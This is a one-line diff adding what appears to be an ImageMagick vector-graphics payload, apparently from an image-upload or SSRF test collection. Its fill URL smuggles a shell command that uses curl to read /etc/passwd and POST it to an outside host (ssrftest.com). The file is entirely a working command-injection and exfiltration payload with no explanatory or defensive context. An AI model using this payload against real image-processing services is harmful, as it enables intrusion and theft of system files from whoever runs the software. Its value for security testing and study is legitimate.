@@ -1,0 +1,1 @@
+push graphic-context viewbox 0 0 200 200 fill 'url(https://example.123 "|curl -d "@/etc/passwd" -X POST http://ssrftest.com/x/1sUvc?image_ssrf_passwd.jpg ")' pop graphic-context
